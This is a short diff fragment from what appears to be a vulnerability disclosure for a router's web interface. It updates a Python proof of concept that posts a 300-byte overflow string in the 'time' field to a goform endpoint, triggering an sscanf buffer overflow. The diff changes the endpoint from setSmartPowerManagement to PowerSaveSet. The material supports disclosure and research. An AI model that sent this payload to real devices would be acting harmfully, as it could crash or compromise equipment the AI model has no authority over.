@@ -24,7 +24,7 @@ get value from time ,then call sscanf, cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/setSmartPowerManagement"
+url = "http://192.168.1.13/goform/PowerSaveSet"
 payload = 'A'*300 + ':'+'\n'
 
 r = requests.post(url, data={'time': payload})
